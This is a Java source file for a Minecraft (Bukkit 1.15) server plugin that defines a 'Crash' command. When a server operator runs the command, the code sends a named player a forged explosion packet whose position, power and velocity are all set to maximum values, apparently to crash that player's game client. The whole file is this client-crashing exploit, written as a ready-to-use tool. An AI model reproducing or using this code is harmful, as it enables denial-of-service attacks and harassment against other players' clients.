package de.schlauhund.commands;

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_15_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_15_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_15_R1.Vec3D;

public class Crash implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender s, Command arg1, String arg2, String[] args) {

		if (s instanceof Player) {
			Player p = (Player) s;
			if (p.isOp()) {
				if (args.length == 1) {
					Player t = Bukkit.getPlayer(args[0]);
					((CraftPlayer) t).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
							Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE,
							Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
				}
			}
		}
		return false;
	}

}
